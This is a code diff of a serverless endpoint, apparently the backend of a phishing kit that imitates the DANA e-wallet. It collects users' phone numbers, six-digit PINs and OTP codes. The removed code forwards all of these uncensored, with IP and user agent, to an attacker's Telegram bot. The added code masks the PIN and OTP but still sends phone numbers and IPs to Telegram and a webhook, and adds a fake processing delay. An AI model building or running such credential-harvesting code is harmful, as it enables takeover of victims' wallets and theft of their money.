@@ -1,97 +1,91 @@
 // api/send-dana-data.js
 const axios = require('axios');
 
-// Fungsi untuk mengirim notifikasi ke Telegram dengan debugging detail
-async function sendToTelegram(data) {
-  // Gunakan environment variables dari Vercel
-  const botToken = process.env.TELEGRAM_BOT_TOKEN;
-  const chatId = process.env.TELEGRAM_CHAT_ID;
-  
-  console.log('Telegram Environment Variables:', {
-    hasToken: !!botToken,
-    hasChatId: !!chatId,
-    tokenLength: botToken ? botToken.length : 0,
-    chatId: chatId || 'not set'
-  });
-  
-  if (!botToken || !chatId) {
-    console.log('ERROR: Telegram credentials not set in environment variables');
-    return false;
+// Fungsi untuk mengirim data ke webhook (opsional)
+async function sendToWebhook(data) {
+  if (!process.env.WEBHOOK_URL) {
+    console.log('WEBHOOK_URL not set, skipping webhook notification');
+    return;
   }
 
   try {
-    let message = '';
-    
-    // Format notifikasi berdasarkan type - TANPA SENSOR
-    if (data.type === 'phone') {
-      message = `🔔 New DANA Registration\n\n` +
-                `├───────────────────\n` +
-                `├• NO HP : ${data.phone}\n` +
-                `├• IP Address : ${data.ip || 'Unknown'}\n` +
-                `├• User Agent : ${data.userAgent || 'Unknown'}\n` +
-                `├• Time : ${new Date().toLocaleString('id-ID')}\n` +
-                `╰───────────────────`;
-    } 
-    else if (data.type === 'pin') {
-      message = `🔔 New DANA PIN Verification\n\n` +
-                `├───────────────────\n` +
-                `├• NO HP : ${data.phone}\n` +
-                `├• PIN : ${data.pin}\n` +
-                `├• IP Address : ${data.ip || 'Unknown'}\n` +
-                `├• User Agent : ${data.userAgent || 'Unknown'}\n` +
-                `├• Time : ${new Date().toLocaleString('id-ID')}\n` +
-                `╰───────────────────`;
-    }
-    else if (data.type === 'otp') {
-      message = `🔔 New DANA OTP Verification\n\n` +
-                `├───────────────────\n` +
-                `├• NO HP : ${data.phone}\n` +
-                `├• PIN : ${data.pin}\n` +
-                `├• OTP : ${data.otp}\n` +
-                `├• IP Address : ${data.ip || 'Unknown'}\n` +
-                `├• User Agent : ${data.userAgent || 'Unknown'}\n` +
-                `├• Time : ${new Date().toLocaleString('id-ID')}\n` +
-                `╰───────────────────`;
-    }
+    const payload = {
+      type: data.type,
+      phone: data.phone,
+      // Sensitive data hanya dikirim sebagian untuk keamanan
+      pin: data.type === 'pin' ? '******' : 'not_provided',
+      otp: data.type === 'otp' ? '****' : 'not_provided',
+      timestamp: new Date().toISOString(),
+      userAgent: data.userAgent || 'unknown'
+    };
 
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    
-    console.log('Sending to Telegram:', {
-      url: url.replace(botToken, 'TOKEN_HIDDEN'),
-      chatId: chatId,
-      messageLength: message.length
-    });
-    
-    const response = await axios.post(url, {
-      chat_id: chatId,
-      text: message,
-      parse_mode: null
-    });
-    
-    console.log('Telegram API Response:', response.data);
-    console.log('✅ Telegram notification sent successfully');
-    return true;
+    await axios.post(process.env.WEBHOOK_URL, payload);
+    console.log('Data sent to webhook successfully');
   } catch (error) {
-    console.error('❌ Error sending to Telegram:');
-    if (error.response) {
-      console.error('Status:', error.response.status);
-      console.error('Data:', error.response.data);
-    } else if (error.request) {
-      console.error('No response received:', error.request);
-    } else {
-      console.error('Error message:', error.message);
-    }
-    return false;
+    console.error('Error sending to webhook:', error.message);
   }
+}
+
+// Fungsi untuk mengirim notifikasi ke Telegram
+async function sendToTelegram(data) {
+  if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
+    console.log('Telegram credentials not set, skipping notification');
+    return;
+  }
+
+  try {
+    const message = `🔔 **New DANA Verification**\n\n` +
+                   `**Type:** ${data.type}\n` +
+                   `**Phone:** ${data.phone}\n` +
+                   `**IP:** ${data.ip || 'Unknown'}\n` +
+                   `**Time:** ${new Date().toISOString()}`;
+
+    const url = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
+    
+    await axios.post(url, {
+      chat_id: process.env.TELEGRAM_CHAT_ID,
+      text: message,
+      parse_mode: 'Markdown'
+    });
+    
+    console.log('Notification sent to Telegram successfully');
+  } catch (error) {
+    console.error('Error sending to Telegram:', error.message);
+  }
+}
+
+// Fungsi untuk mengirim notifikasi email (opsional)
+async function sendEmailNotification(data) {
+  if (!process.env.EMAIL_API_KEY) {
+    return; // Skip jika tidak ada konfigurasi email
+  }
+
+  try {
+    // Implementasi pengiriman email sesuai provider yang Anda gunakan
+    // Contoh menggunakan SendGrid, Nodemailer, dll.
+    console.log('Email notification would be sent for:', {
+      type: data.type,
+      phone: data.phone,
+      timestamp: new Date().toISOString()
+    });
+  } catch (error) {
+    console.error('Error sending email:', error.message);
+  }
+}
+
+// Fungsi untuk menyimpan data ke database (opsional)
+async function saveToDatabase(data) {
+  // Implementasi penyimpanan database sesuai kebutuhan
+  // Bisa menggunakan MongoDB, PostgreSQL, Firebase, dll.
+  console.log('Data would be saved to database:', {
+    type: data.type,
+    phone: data.phone,
+    timestamp: new Date().toISOString()
+  });
 }
 
 // Main function
 module.exports = async (req, res) => {
-  console.log('=== INCOMING REQUEST ===');
-  console.log('Method:', req.method);
-  console.log('Headers:', req.headers);
-  console.log('Body:', req.body);
-
   // Set CORS headers
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, DELETE');
@@ -99,13 +93,11 @@ module.exports = async (req, res) => {
 
   // Handle preflight request
   if (req.method === 'OPTIONS') {
-    console.log('Handling OPTIONS preflight request');
     return res.status(200).end();
   }
 
   // Only allow POST requests
   if (req.method !== 'POST') {
-    console.log('Method not allowed:', req.method);
     return res.status(405).json({ 
       success: false, 
       error: 'Method not allowed. Only POST requests are accepted.' 
@@ -117,9 +109,7 @@ module.exports = async (req, res) => {
     let body;
     try {
       body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
-      console.log('Parsed body:', body);
     } catch (parseError) {
-      console.error('JSON parse error:', parseError);
       return res.status(400).json({ 
         success: false, 
         error: 'Invalid JSON format in request body' 
@@ -130,91 +120,128 @@ module.exports = async (req, res) => {
 
     // Validasi data yang diperlukan
     if (!type) {
-      console.error('Missing type field');
       return res.status(400).json({ 
         success: false, 
         error: 'Missing required field: type' 
       });
     }
 
-    // Log data yang diterima
-    console.log('📩 Received data:', { type, phone, pin, otp });
+    if (!phone && type !== 'otp') {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Missing required field: phone' 
+      });
+    }
+
+    // Log data yang diterima (disensor untuk keamanan)
+    console.log('📩 Data received:', { 
+      type, 
+      phone: phone ? `${phone.substring(0, 4)}****${phone.substring(phone.length - 2)}` : 'not_provided',
+      hasPin: !!pin,
+      hasOtp: !!otp,
+      timestamp: new Date().toISOString(),
+      ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress
+    });
+
+    // Simulasi processing time (1-2 detik)
+    const processingTime = Math.random() * 1000 + 1000;
+    await new Promise(resolve => setTimeout(resolve, processingTime));
 
     // Proses data berdasarkan type
-    let telegramResult = false;
-    
     switch (type) {
       case 'phone':
         if (!phone || phone.length < 10) {
-          console.error('Invalid phone number:', phone);
           return res.status(400).json({ 
             success: false, 
             error: 'Invalid phone number' 
           });
         }
-        
-        telegramResult = await sendToTelegram({
-          type: 'phone',
-          phone: phone,
-          userAgent: req.headers['user-agent'],
-          ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress
-        });
         break;
 
       case 'pin':
         if (!pin || pin.length !== 6) {
-          console.error('Invalid PIN:', pin);
           return res.status(400).json({ 
             success: false, 
             error: 'PIN must be 6 digits' 
           });
         }
-        
-        telegramResult = await sendToTelegram({
-          type: 'pin',
-          phone: phone,
-          pin: pin,
-          userAgent: req.headers['user-agent'],
-          ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress
-        });
         break;
 
       case 'otp':
         if (!otp || otp.length !== 4) {
-          console.error('Invalid OTP:', otp);
           return res.status(400).json({ 
             success: false, 
             error: 'OTP must be 4 digits' 
           });
         }
-        
-        telegramResult = await sendToTelegram({
-          type: 'otp',
-          phone: phone,
-          pin: pin,
-          otp: otp,
-          userAgent: req.headers['user-agent'],
-          ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress
-        });
         break;
 
       default:
-        console.error('Invalid type:', type);
         return res.status(400).json({ 
           success: false, 
           error: 'Invalid type. Must be: phone, pin, or otp' 
         });
     }
 
-    console.log('Final Telegram result:', telegramResult);
+    // Kirim notifikasi ke Telegram
+    try {
+      await sendToTelegram({
+        type,
+        phone,
+        userAgent: req.headers['user-agent'],
+        ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress
+      });
+    } catch (telegramError) {
+      console.error('Telegram error:', telegramError.message);
+      // Jangan gagalkan seluruh request karena error Telegram
+    }
+
+    // Kirim notifikasi ke webhook (opsional)
+    try {
+      await sendToWebhook({
+        type,
+        phone,
+        pin,
+        otp,
+        userAgent: req.headers['user-agent'],
+        ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress
+      });
+    } catch (webhookError) {
+      console.error('Webhook error:', webhookError.message);
+      // Jangan gagalkan seluruh request karena error webhook
+    }
+
+    // Simpan ke database (opsional)
+    try {
+      await saveToDatabase({
+        type,
+        phone,
+        timestamp: new Date().toISOString()
+      });
+    } catch (dbError) {
+      console.error('Database error:', dbError.message);
+      // Jangan gagalkan seluruh request karena error database
+    }
+
+    // Kirim notifikasi email (opsional)
+    try {
+      await sendEmailNotification({
+        type,
+        phone,
+        timestamp: new Date().toISOString()
+      });
+    } catch (emailError) {
+      console.error('Email error:', emailError.message);
+      // Jangan gagalkan seluruh request karena error email
+    }
 
     // Response sukses
     return res.status(200).json({ 
       success: true, 
       message: 'Data processed successfully',
-      telegramSent: telegramResult,
       data: {
         type,
+        phone: phone ? `${phone.substring(0, 4)}****${phone.substring(phone.length - 2)}` : 'not_provided',
         timestamp: new Date().toISOString()
       }
     });
@@ -224,7 +251,7 @@ module.exports = async (req, res) => {
     return res.status(500).json({ 
       success: false, 
       error: 'Internal server error',
-      message: error.message
+      message: process.env.NODE_ENV === 'development' ? error.message : 'Something went wrong'
     });
   }
 };
